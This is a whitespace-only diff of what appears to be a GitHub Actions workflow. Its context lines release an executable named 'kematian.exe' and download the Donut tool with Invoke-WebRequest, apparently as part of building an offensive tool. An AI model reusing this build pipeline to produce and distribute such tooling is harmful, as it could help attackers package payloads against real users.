@@ -70,7 +70,7 @@ jobs:
         asset_path: kematian-src\kematian.exe
         asset_name: kematian.exe
         asset_content_type: application/zip
-       
+
     # Download Donut
     - name: Download Donut
       run: Invoke-WebRequest https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -OutFile donut.zip
